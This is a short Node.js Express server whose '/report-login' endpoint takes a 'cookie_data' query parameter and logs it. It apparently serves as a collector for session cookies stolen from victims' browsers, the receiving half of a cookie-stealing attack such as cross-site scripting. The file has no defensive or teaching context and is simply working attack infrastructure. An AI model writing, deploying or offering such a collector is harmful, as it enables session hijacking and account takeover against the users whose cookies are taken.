const express = require('express')
const app = express()
const port = 5111

app.get('/report-login', (request, response) => {
  const cookieData = request.query.cookie_data;
  console.log({cookieData});
  response.sendStatus(200)
})

app.listen(port, (err) => {
  if (err) {
    return console.log('something bad happened', err)
  }

  console.log(`server is listening on ${port} - Direct all requests to /report-login`)
})
